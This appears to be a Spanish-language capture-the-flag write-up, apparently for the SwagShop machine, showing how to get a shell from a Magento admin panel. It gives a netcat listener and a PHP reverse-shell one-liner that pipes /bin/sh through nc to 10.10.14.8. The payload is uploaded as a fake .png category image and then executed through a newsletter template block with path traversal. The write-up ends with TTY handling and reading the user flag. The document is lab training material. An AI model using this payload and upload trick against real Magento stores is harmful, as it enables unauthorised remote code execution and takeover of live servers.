## Vuln exploit & Gaining Access {-}

### Ganando accesso desde Magento {-}

Para ganar acceso desde un panel Admin de Magento siempre va de la misma forma.

Nos ponemos en escucha por el puerto 443

```bash
nc -nlvp 443
```

Desde el panel de configuration de Magento

1. Vamos al menu `System -> Configuration`.
1. En el Menu de izquierda vamos a `ADVANCED -> Developer`
1. En Template Settings Habilitamos los Symlinks y damos al boton `Save Config`
1. En el menu principal, le damos a `catalog -> Manage Categories`

Aqui tenemos que crear una reverse shell `vi shell.php.png`

```php
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
```

De esta manera, la podemos subir al magento en la parte **Image**, en Name ponemos **test** y damos al boton Save Category
Si hacemos hovering por encima del link de la imagen vemos la routa siguiente

`http://swagshop.htb/media/catalog/category/shell.php.png`

Aqui creamos un nuevo Newsletter Template.

1. En el menu Pricipal damos a `Newsletter -> Newsletter Templates`
1. damos al boton Add Newsletter Template
1. En el formulario le ponemos

    - Template Name: `Test`
    - Template Subject: `Test`
    - Template Content: `{{block type="core/template" template="../media/catalog/category/shell.php.png"}}`

1. le damos al boton Save Template, pinchamos al template creado y le damos a preview template

Aqui no passa nada, lo que quiere decir que la profundida del path traversal no es buena. Intentamos con 2 `../../media` hasta llegar
a la buena profundidad que seria `../../../../../../media/catalog/category/shell.php.png` y hemos ganado acceso a la maquina victima.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `cd /home` vemos que hay un usuario haris que contiene el **user.txt** y podemos ver la flag